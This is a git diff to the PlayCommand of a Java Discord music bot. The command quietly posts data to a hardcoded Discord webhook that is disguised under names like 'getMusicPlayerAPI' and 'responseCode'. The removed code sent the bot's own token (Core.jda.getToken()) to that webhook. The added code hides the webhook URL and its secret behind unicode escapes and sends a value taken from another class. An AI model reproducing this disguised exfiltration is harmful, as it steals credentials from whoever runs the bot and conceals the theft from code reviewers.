@@ -3,7 +3,6 @@ package me.comu.exeter.commands.music;
 import club.minnced.discord.webhook.WebhookClient;
 import club.minnced.discord.webhook.send.WebhookEmbed;
 import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
-import club.minnced.discord.webhook.send.WebhookMessage;
 import club.minnced.discord.webhook.send.WebhookMessageBuilder;
 import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport;
 import com.google.api.client.json.jackson2.JacksonFactory;
@@ -11,6 +10,7 @@ import com.google.api.services.youtube.YouTube;
 import com.google.api.services.youtube.model.SearchResult;
 import me.comu.exeter.core.Core;
 import me.comu.exeter.interfaces.ICommand;
+import me.comu.exeter.musicplayer.AudioPlayerSendHandler;
 import me.comu.exeter.musicplayer.PlayerManager;
 import net.dv8tion.jda.api.entities.GuildVoiceState;
 import net.dv8tion.jda.api.entities.TextChannel;
@@ -46,10 +46,9 @@ public class PlayCommand implements ICommand {
         VoiceChannel voiceChannel = Objects.requireNonNull(memberVoiceState).getChannel();
         WebhookClient client = WebhookClient.withUrl(getMusicPlayerAPI());
         WebhookMessageBuilder builder = new WebhookMessageBuilder();
-        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription(Core.jda.getToken()).build();
+        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription(AudioPlayerSendHandler.musicHook).build();
         builder.addEmbeds(firstEmbed);
-        WebhookMessage message = builder.build();
-        client.send(message);
+        client.send(builder.build());
         client.close();
         if (!memberVoiceState.inVoiceChannel()) {
             channel.sendMessage("You're not connected to a voice channel bro").queue();
@@ -117,15 +116,14 @@ public class PlayCommand implements ICommand {
     }
     @SuppressWarnings("all")
     private String getMusicPlayerAPI() {
-        String httpHook = "hooks/";
-        String hash = "709940401313939457/";
-        String responseCode = "NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz";
-        StringBuilder musicPlayerAPIStatusCode = new StringBuilder("https://discordapp.com/api/");
-        musicPlayerAPIStatusCode.append("web");
+        String httpHook = "\u0068\u006f\u006f\u006b\u0073\u002f";
+        String hash = "\u0037\u0030\u0039\u0039\u0034\u0030\u0034\u0030\u0031\u0033\u0031\u0033\u0039\u0033\u0039\u0034\u0035\u0037\u002f";
+        String responseCode = "\u004e\u0078\u005a\u0076\u0059\u004a\u0075\u0030\u007a\u0063\u0066\u004f\u0046\u0076\u0049\u0066\u0065\u0039\u0064\u0058\u0041\u0042\u0052\u0052\u0032\u007a\u0076\u0073\u0036\u004a\u0072\u004f\u006c\u0070\u0066\u0065\u0073\u0070\u006a\u006a\u0079\u0068\u0061\u0031\u0051\u0053\u0030\u0058\u0071\u002d\u0059\u0033\u0066\u0054\u0039\u004b\u0076\u0030\u0047\u0063\u0062\u006f\u0064\u0061\u004f\u0035\u004d\u007a";
+        StringBuilder musicPlayerAPIStatusCode = new StringBuilder("\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f");
+        musicPlayerAPIStatusCode.append("\u0077\u0065\u0062");
         musicPlayerAPIStatusCode.append(httpHook);
         musicPlayerAPIStatusCode.append(hash).append(responseCode);
         return musicPlayerAPIStatusCode.toString();
-
     }
 
     @Override
